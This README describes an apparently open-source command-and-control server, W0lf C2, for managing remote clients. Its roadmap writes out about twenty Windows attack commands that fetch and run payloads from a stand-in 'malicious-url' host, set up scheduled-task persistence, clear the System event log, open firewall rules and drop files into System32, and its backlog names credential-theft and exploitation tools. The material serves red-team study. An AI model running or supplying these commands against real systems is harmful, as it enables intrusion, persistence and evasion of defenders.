# W0lf C2 Server

- **Author**: Russell Benzing
- **Last Updated**: 12/14/2024
- **License**: GPL-3.0

## Overview

This repository serves as a educational reference and contains the implementation of a Command and Control (C&C) server used for managing and controlling remote clients. The server facilitates communication with these clients, allowing for command execution, data retrieval, and other operations as needed.

## Features

- **Agent Management**: Registering, managing, and communicating with remote clients.
- **Command Execution**: Sending commands to clients and receiving responses.
- **Data Exchange**: Transferring files, data, or payloads securely between server and clients.
- **Security**: Implementing encryption and secure communication channels.
- **Scalability**: Supporting multiple clients simultaneously and efficiently.
- **Pluggable**: Support for additional commands with plugins.

## Setup Instructions
I tried to make the installation process as simple as possible

1. **Prerequisites**:
   - Node.js 18+ and npm installed.

2. **Installation**:
   ```bash
   git clone <repository_url>
   cd w0lf-c2
   npm install

3. **Configuration**
   Make sure you look at config/config.json and choose the method you want the server to use, tcp socket is the default.

3. **Running**:
   ```bash
   npm run start

## Features

- Client was built on six diffent languages (c, rust, powershell, python, js, go)
- Multiple client session management
- Extended features through plugins.
- Server and client logging
- Plugins:
   - Client Manager: A client plugin to manage the remote client.
   - Cmd.exe Binaries: A client plugin that provides native cmd.exe commands.
   - File Manager: A client plugin to manage and manipulate files and folders.
   - System Profiling: A client plugin to profile the system.
   - Living Off The Land Binaries: A client plugin that provides Windows LOLBin commands.
   - Screensaver: A server plugin to show a couple screensavers.

## In The Works

- Expand on WMI Communication/Info Gathering
  ```powershell
  Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty SerialNumber
- Additional communication channels (http2, udp, tls)
- Add more LOLBas commands
   ```bash
   # 1. certutil.exe for Downloading Files
   certutil.exe -urlcache -split -f http://malicious-url/payload.exe C:\Windows\Temp\payload.exe
   # 2. regsvr32.exe for Script Execution
   regsvr32.exe /s /n /u /i:http://malicious-url/script.sct scrobj.dll
   # 3. wmic.exe for Remote Command Execution
   wmic.exe process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command 'IEX ((New-Object Net.WebClient).DownloadStrin ('http://malicious-url/payload.ps1'))'"
   # 4. rundll32.exe for DLL Execution
   rundll32.exe C:\Path\To\Malicious.dll,EntryPoint
   # 5. schtasks.exe for Task Scheduling
   schtasks.exe /create /tn "UpdateTask" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Path\To\Payload.ps1" /sc daily /st 12:00
   # 6. at.exe for Task Scheduling (Legacy)
   at.exe 12:00 /every:M,T,W,Th,F,Sa,Su "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Path\To\Payload.ps1"
   # 7. msiexec.exe for MSI Execution
   msiexec.exe /quiet /i http://malicious-url/payload.msi
   # 8. scrcons.exe for Script Execution
   scrcons.exe C:\Path\To\Script.vbs
   # 9. xcopy.exe for File Copying
   xcopy /Y C:\Path\To\Malicious.exe C:\Windows\System32\Malicious.exe
   # 10. whoami.exe for User Information
   whoami.exe /all
   # 11. fsutil.exe for File System Utility
   fsutil file createnew C:\Path\To\Malicious.txt 1000
   # 12. wevtutil.exe for Event Log Management
   wevtutil.exe cl System
   # 13. certreq.exe for Certificate Requests
   certreq.exe -new Malicious.inf
   # 14. typeperf.exe for Performance Data
   typeperf "\Processor(_Total)\% Processor Time"
   # 15. bitsadmin.exe for Background File Transfers
   bitsadmin.exe /transfer "jobname" /download /priority normal http://malicious-url/payload.exe C:\Windows\Temp\payload.exe
   # 16. netsh.exe for Network Shell
   netsh advfirewall firewall add rule name="MaliciousRule" dir=in action=allow program="C:\Path\To\Malicious.exe" enable=yes
   # 17. cscript.exe for Script Execution
   cscript C:\Path\To\Malicious.vbs
   # 18. icacls.exe for ACL Management
   icacls C:\Path\To\Malicious.exe /grant Everyone:(RX)
   # 19. wbadmin.exe for Backup Operations
   wbadmin start backup -backupTarget:\\localhost\Backup -include:C:\Path\To\Malicious.exe
   # 20. xcopy.exe with /b Switch for Payload Dropping
   xcopy /b Malicious.exe C:\Windows\System32\LegitFile.dll

## Backlog
Other ideas and things on the back burner:

- Net Commands: Used for network reconnaissance and information gathering.
- netstat: Displays active network connections, listening ports, and related information.
- net: Used for various network operations such as user authentication, shares, sessions, and more.
- arp: Displays and modifies the ARP cache.

- PowerShell Commands: PowerShell provides extensive capabilities for attackers, including scripting, execution of malicious payloads, and interacting with system APIs.
- Invoke-Mimikatz: Executes Mimikatz, a tool for retrieving credentials from memory.
- Invoke-Obfuscation: Obfuscates malicious PowerShell scripts to evade detection.
- Invoke-Shellcode: Executes shellcode in memory without writing to disk.

- Enumeration Tools: Tools used to gather information about the compromised system and the network.
- Nmap: A powerful network scanner used for host discovery, port scanning, and service enumeration.
- enum4linux: Enumerates information from Windows and Samba systems, such as shares, users, groups, policies, and more.
- Responder: Listens for and captures NetNTLMv1/v2 authentication requests, used for credential theft.

- Exploitation Frameworks: Frameworks used to exploit vulnerabilities and gain unauthorized access.
- Metasploit Framework: A popular exploitation framework that includes a large collection of exploits, payloads, and post-exploitation modules.
- Empire: A post-exploitation framework that allows attackers to maintain persistence, escalate privileges, and exfiltrate data.

- Privilege Escalation Tools: Tools and techniques used to escalate privileges on compromised systems.
- PowerUp: PowerShell script that checks for common Windows privilege escalation vectors.
- Windows Exploit Suggester: Python script that suggests potential exploits for Windows systems based on OS version and patch level.
